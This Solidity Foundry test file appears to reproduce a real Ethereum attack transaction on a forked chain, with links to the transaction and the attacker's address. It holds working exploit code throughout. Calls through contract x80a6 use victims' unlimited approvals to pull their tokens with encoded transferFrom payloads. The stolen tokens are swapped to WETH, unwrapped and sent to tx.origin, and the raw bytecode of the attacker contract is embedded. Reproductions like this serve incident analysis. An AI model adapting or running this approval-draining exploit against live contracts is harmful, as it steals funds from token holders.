// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92
// https://etherscan.io/address/0xCE6397e53c13ff2903FfE8735e478d31E648a2c6

interface I {
    function allowance(address, address) external payable returns (uint256);
    function approve(address, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
    function getAmountsOut(uint256, address[] memory) external payable;
    function withdraw(uint256) external payable;
}

contract Xe6c6 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92");
    }

    address constant x4189 = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6476 = 0x6476425a65Ae09e22383B68416b32AbE62896aa9;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x80a6 = 0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e;
    address constant x942b = 0x942beCA935703058E26527d0bD49D00E85841772;
    address constant x9689 = 0x968907878bDF60638FFdD5E4759289941333bf94;
    address constant xa516 = 0xA5162195e6CB7483eea8bA878d147b0E90519c64;
    address constant xaaee = 0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd0b4 = 0xD0b4EE02E9bA15b9dac916d2CCAbaD50F836B24D;
    address constant xe841 = 0xe84180bdc970c01B30a326f610F110acB23EcdBe;

    function test1() public {
        // vm.startPrank(0xCE6397e53c13ff2903FfE8735e478d31E648a2c6, 0xCE6397e53c13ff2903FfE8735e478d31E648a2c6);

        vm.createSelectFork("http://localhost:18545", 18423219); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xaf321e7b2c630b2a80c94de23958b1f49d4193b5878738d058c5a02576668374));

        // https://explorer.phalcon.xyz/tx/eth/0xaf321e7b2c630b2a80c94de23958b1f49d4193b5878738d058c5a02576668374
        this.xaf321e7b();
        // https://explorer.phalcon.xyz/tx/eth/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92
        x30f5d90e();
    }

    function test2() public {
        // vm.startPrank(0xCE6397e53c13ff2903FfE8735e478d31E648a2c6, 0xCE6397e53c13ff2903FfE8735e478d31E648a2c6);

        vm.createSelectFork("http://localhost:18545", 18423208); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xaf321e7b2c630b2a80c94de23958b1f49d4193b5878738d058c5a02576668374
        this.xaf321e7b();
        vm.warp(1698188027);
        vm.roll(18423219);
        // https://explorer.phalcon.xyz/tx/eth/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92
        x30f5d90e();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 18423219); // tx.blockNumber - 1

        vm.warp(1698188027);
        vm.roll(18423220);
        // https://explorer.phalcon.xyz/tx/eth/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92
        x30f5d90e();
    }

    function xaf321e7b() public {
        _constructor_();
    }

    function x30f5d90e() public {
        // uint256 v1 = 7644407423323066647459234468;
        uint256 v1 = I(xaaee).balanceOf(x4189);
        console2.log("I(xaaee).balanceOf(x4189)\t->", "7644407423323066647459234468 (7644407423.3230 ether)");
        // uint256 v2 = type(uint256).max;
        uint256 v2 = I(xaaee).allowance(x4189, x80a6);
        console2.log("I(xaaee).allowance(x4189, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd0000000000000000000000004189ad9624f838eef865b09a0be3369eaacd8f6f000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab000000000000000000000000000000000000000018b34e3cc95bf3495b3182a400000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v3 = 48204641774314921136106786239;
        uint256 v3 = I(xaaee).balanceOf(xd0b4);
        console2.log("I(xaaee).balanceOf(xd0b4)\t->", "48204641774314921136106786239 (48204641774.3149 ether)");
        // uint256 v4 = type(uint256).max;
        uint256 v4 = I(xaaee).allowance(xd0b4, x80a6);
        console2.log("I(xaaee).allowance(xd0b4, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd000000000000000000000000d0b4ee02e9ba15b9dac916d2ccabad50f836b24d000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab00000000000000000000000000000000000000009bc1f1f2c7a6ab8124e04dbf00000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v5 = 80397781241681974651232867727;
        uint256 v5 = I(xaaee).balanceOf(xe841);
        console2.log("I(xaaee).balanceOf(xe841)\t->", "80397781241681974651232867727 (80397781241.6819 ether)");
        // uint256 v6 = type(uint256).max;
        uint256 v6 = I(xaaee).allowance(xe841, x80a6);
        console2.log("I(xaaee).allowance(xe841, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd000000000000000000000000e84180bdc970c01b30a326f610f110acb23ecdbe000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab000000000000000000000000000000000000000103c77c664325dfa8f0d2558f00000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v7 = 334490752124122713685016489776;
        uint256 v7 = I(xaaee).balanceOf(x6476);
        console2.log("I(xaaee).balanceOf(x6476)\t->", "334490752124122713685016489776 (334490752124.1227 ether)");
        // uint256 v8 = type(uint256).max;
        uint256 v8 = I(xaaee).allowance(x6476, x80a6);
        console2.log("I(xaaee).allowance(x6476, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd0000000000000000000000006476425a65ae09e22383b68416b32abe62896aa9000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab000000000000000000000000000000000000000438cc43e676d67a0228ecaf3000000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v9 = 0;
        uint256 v9 = I(xaaee).balanceOf(xe841);
        console2.log("I(xaaee).balanceOf(xe841)\t->", uint256(0));
        // uint256 v10 = type(uint256).max;
        uint256 v10 = I(xaaee).allowance(xe841, x80a6);
        console2.log("I(xaaee).allowance(xe841, x80a6)\t->", uint256(type(uint256).max));
        // uint256 v11 = 81546385133717720246700811579;
        uint256 v11 = I(xaaee).balanceOf(x942b);
        console2.log("I(xaaee).balanceOf(x942b)\t->", "81546385133717720246700811579 (81546385133.7177 ether)");
        // uint256 v12 = type(uint256).max;
        uint256 v12 = I(xaaee).allowance(x942b, x80a6);
        console2.log("I(xaaee).allowance(x942b, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd000000000000000000000000942beca935703058e26527d0bd49d00e85841772000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab0000000000000000000000000000000000000001077d96bc040cc2c39049253b00000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v13 = 7755411711468452260359557922;
        uint256 v13 = I(xaaee).balanceOf(x9689);
        console2.log("I(xaaee).balanceOf(x9689)\t->", "7755411711468452260359557922 (7755411711.4684 ether)");
        // uint256 v14 = type(uint256).max;
        uint256 v14 = I(xaaee).allowance(x9689, x80a6);
        console2.log("I(xaaee).allowance(x9689, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd000000000000000000000000968907878bdf60638ffdd5e4759289941333bf94000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab0000000000000000000000000000000000000000190f204f4dff92f7c991d32200000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v15 = 5424143385553749039595786285;
        uint256 v15 = I(xaaee).balanceOf(xa516);
        console2.log("I(xaaee).balanceOf(xa516)\t->", "5424143385553749039595786285 (5424143385.5537 ether)");
        // uint256 v16 = type(uint256).max;
        uint256 v16 = I(xaaee).allowance(xa516, x80a6);
        console2.log("I(xaaee).allowance(xa516, x80a6)\t->", uint256(type(uint256).max));
        x80a6.call(
            abi.encodeWithSelector(
                0x9239127f,
                xaaee,
                128,
                0,
                0,
                100,
                hex"23b872dd000000000000000000000000a5162195e6cb7483eea8ba878d147b0e90519c64000000000000000000000000e6c6e86e04de96c4e3a29ad480c94e7a471969ab00000000000000000000000000000000000000001186bf0a1fe0104a9896102d00000000000000000000000000000000000000000000000000000000"
            )
        );
        // uint256 v17 = 565463522794182597666471533996;
        uint256 v17 = I(xaaee).balanceOf(r);
        console2.log("I(xaaee).balanceOf(r)\t\t->", "565463522794182597666471533996 (565463522794.1825 ether)");
        I(xaaee).approve(x7a25, v17);

        address[] memory arr01 = new address[](2);
        arr01[0] = xaaee;
        arr01[1] = xc02a;
        I(x7a25).getAmountsOut(v17, arr01);

        address[] memory arr02 = new address[](2);
        arr02[0] = xaaee;
        arr02[1] = xc02a;
        I(x7a25).swapExactTokensForTokensSupportingFeeOnTransferTokens(v17, 0, arr02, r, block.timestamp + 1);

        // uint256 v18 = 14040863116812856819;
        uint256 v18 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "14040863116812856819 (14.4086 ether)");
        I(xc02a).withdraw(v18);
        address(tx.origin).call{value: 14040863116812856819}("");
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100595760003560e01c806330f5d90e146100655780633df368bd14610087578063b0711e08146100b3578063b603cd80146100c9578063be6002c2146100de578063df8de3e71461010b57600080fd5b3661006057005b600080fd5b34801561007157600080fd5b50610085610080366004610c94565b61012b565b005b34801561009357600080fd5b5061009d60015481565b6040516100aa9190610f99565b60405180910390f35b3480156100bf57600080fd5b5061009d60025481565b3480156100d557600080fd5b506100856104aa565b3480156100ea57600080fd5b506100fe6100f9366004610cfc565b6104d9565b6040516100aa9190610f5c565b34801561011757600080fd5b50610085610126366004610c76565b610573565b6000546001600160a01b0316321461014257600080fd5b33321461014e57600080fd5b60005b818110156102de57600061019a8585858581811061017f57634e487b7160e01b600052603260045260246000fd5b90506020020160208101906101949190610c76565b886106a7565b905080156102d55760006323b872dd8585858181106101c957634e487b7160e01b600052603260045260246000fd5b90506020020160208101906101de9190610c76565b30846040516024016101f293929190610ed4565b6040516020818303038152906040529060e01b6020820180516001600160e01b03838183161783525050505090506000876001600160a01b0316639239127f88846000806040516024016102499493929190610efc565b6040516020818303038152906040529060e01b6020820180516001600160e01b0383818316178352505050506040516102829190610e9f565b6000604051808303816000865af19150503d80600081146102bf576040519150601f19603f3d011682016040523d82523d6000602084013e6102c4565b606091505b50509050806102d257600080fd5b50505b50600101610151565b506040516370a0823160e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d9073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290610396908390879084906001600160a01b038316906370a0823190610341903090600401610eab565b60206040518083038186803b15801561035957600080fd5b505afa15801561036d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103919190610da1565b6107c0565b6040516370a0823160e01b81526001600160a01b03821690632e1a7d4d9082906370a08231906103ca903090600401610eab565b60206040518083038186803b1580156103e257600080fd5b505afa1580156103f6573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061041a9190610da1565b6040518263ffffffff1660e01b81526004016104369190610f99565b600060405180830381600087803b15801561045057600080fd5b505af1158015610464573d6000803e3d6000fd5b5050600080546040516001600160a01b0390911693504780156108fc02935091818181858888f193505050501580156104a1573d6000803e3d6000fd5b50505050505050565b6000546001600160a01b03163314806104c257503330145b6104cb57600080fd5b6000546001600160a01b0316ff5b6000546060906001600160a01b03163314806104f457503330145b6104fd57600080fd5b600080846001600160a01b0316846040516105189190610e9f565b6000604051808303816000865af19150503d8060008114610555576040519150601f19603f3d011682016040523d82523d6000602084013e61055a565b606091505b50915091508161056957600080fd5b9150505b92915050565b6000546001600160a01b031633148061058b57503330145b61059457600080fd5b6040516370a0823160e01b81526000906001600160a01b038316906370a08231906105c3903090600401610eab565b60206040518083038186803b1580156105db57600080fd5b505afa1580156105ef573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106139190610da1565b905080156106a35760005460405163a9059cbb60e01b81526001600160a01b038481169263a9059cbb9261064f92909116908590600401610f41565b602060405180830381600087803b15801561066957600080fd5b505af115801561067d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106a19190610d83565b505b5050565b600080846001600160a01b03166370a08231856040518263ffffffff1660e01b81526004016106d69190610eab565b60206040518083038186803b1580156106ee57600080fd5b505afa158015610702573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107269190610da1565b90506000856001600160a01b031663dd62ed3e86866040518363ffffffff1660e01b8152600401610758929190610eb9565b60206040518083038186803b15801561077057600080fd5b505afa158015610784573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107a89190610da1565b90508181116107b5578091505b5090505b9392505050565b604080516002808252606082018352600092602083019080368337019050509050838160008151811061080357634e487b7160e01b600052603260045260246000fd5b60200260200101906001600160a01b031690816001600160a01b031681525050828160018151811061084557634e487b7160e01b600052603260045260246000fd5b60200260200101906001600160a01b031690816001600160a01b03168152505061087385828460013061087a565b5050505050565b60008590506108b2856000815181106108a357634e487b7160e01b600052603260045260246000fd5b60200260200101518786610a7c565b60405163d06ca61f60e01b81526000906001600160a01b0383169063d06ca61f906108e39088908a90600401610fa7565b60006040518083038186803b1580156108fb57600080fd5b505afa15801561090f573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526109379190810190610d4e565b90506000816001835161094a91906110a0565b8151811061096857634e487b7160e01b600052603260045260246000fd5b6020908102919091010151905084610a0a576040516338ed173960e01b81526001600160a01b038416906338ed1739906109ae90899085908c908a90429060040161101a565b600060405180830381600087803b1580156109c857600080fd5b505af11580156109dc573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610a049190810190610d4e565b50610a72565b604051635c11d79560e01b81526001600160a01b03841690635c11d79590610a3f9089906000908c908a904290600401610fc7565b600060405180830381600087803b158015610a5957600080fd5b505af1158015610a6d573d6000803e3d6000fd5b505050505b5050505050505050565b60405163095ea7b360e01b81526001600160a01b0384169063095ea7b390610aaa9085908590600401610f41565b602060405180830381600087803b158015610ac457600080fd5b505af1158015610ad8573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610afc9190610d83565b6106a15760405162461bcd60e51b8152600401610b1890610f6d565b60405180910390fd5b6000610b34610b2f84611051565b611035565b90508083825260208201905082856020860282011115610b5357600080fd5b60005b85811015610b7f5781610b698882610c6b565b8452506020928301929190910190600101610b56565b5050509392505050565b6000610b97610b2f84611075565b905082815260208101848484011115610baf57600080fd5b610bba8482856110db565b509392505050565b803561056d81611170565b60008083601f840112610bdf57600080fd5b50813567ffffffffffffffff811115610bf757600080fd5b602083019150836020820283011115610c0f57600080fd5b9250929050565b600082601f830112610c2757600080fd5b8151610c37848260208601610b21565b949350505050565b805161056d81611187565b600082601f830112610c5b57600080fd5b8135610c37848260208601610b89565b805161056d8161118f565b600060208284031215610c8857600080fd5b6000610c378484610bc2565b60008060008060608587031215610caa57600080fd5b6000610cb68787610bc2565b9450506020610cc787828801610bc2565b935050604085013567ffffffffffffffff811115610ce457600080fd5b610cf087828801610bcd565b95989497509550505050565b60008060408385031215610d0f57600080fd5b6000610d1b8585610bc2565b925050602083013567ffffffffffffffff811115610d3857600080fd5b610d4485828601610c4a565b9150509250929050565b600060208284031215610d6057600080fd5b815167ffffffffffffffff811115610d7757600080fd5b610c3784828501610c16565b600060208284031215610d9557600080fd5b6000610c378484610c3f565b600060208284031215610db357600080fd5b6000610c378484610c6b565b6000610dcb8383610dd3565b505060200190565b610ddc816110b7565b82525050565b6000610dec825190565b80845260209384019383018060005b83811015610e20578151610e0f8882610dbf565b975060208301925050600101610dfb565b509495945050505050565b801515610ddc565b6000610e3d825190565b808452602084019350610e548185602086016110e7565b601f01601f19169290920192915050565b6000610e6f825190565b610e7d8185602086016110e7565b9290920192915050565b610ddc816110c8565b610ddc816110d0565b80610ddc565b60006107b98284610e65565b6020810161056d8284610dd3565b60408101610ec78285610dd3565b6107b96020830184610dd3565b60608101610ee28286610dd3565b610eef6020830185610dd3565b610c376040830184610e99565b60808101610f0a8287610dd3565b8181036020830152610f1c8186610e33565b9050610f2b6040830185610e90565b610f386060830184610e2b565b95945050505050565b60408101610f4f8285610dd3565b6107b96020830184610e99565b602080825281016107b98184610e33565b6020808252810161056d81600e81526d185c1c1c9bdd994819985a5b195960921b602082015260400190565b6020810161056d8284610e99565b60408101610fb58285610e99565b8181036020830152610c378184610de2565b60a08101610fd58288610e99565b610fe26020830187610e87565b8181036040830152610ff48186610de2565b90506110036060830185610dd3565b6110106080830184610e99565b9695505050505050565b60a081016110288288610e99565b610fe26020830187610e99565b600061104060405190565b905061104c8282611117565b919050565b600067ffffffffffffffff82111561106b5761106b61115a565b5060209081020190565b600067ffffffffffffffff82111561108f5761108f61115a565b601f19601f83011660200192915050565b6000828210156110b2576110b2611144565b500390565b60006001600160a01b03821661056d565b60008161056d565b600060ff821661056d565b82818337506000910152565b60005b838110156111025781810151838201526020016110ea565b83811115611111576000848401525b50505050565b601f19601f830116810181811067ffffffffffffffff8211171561113d5761113d61115a565b6040525050565b634e487b7160e01b600052601160045260246000fd5b634e487b7160e01b600052604160045260246000fd5b611179816110b7565b811461118457600080fd5b50565b801515611179565b8061117956fea2646970667358221220c19e08f46f529f0ea526112fbb4917c61abaf8b812bea6bf80c6767a7524959064736f6c63430008040033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function call() public payable {}

    fallback() external payable {
        revert("no such function");
    }
}
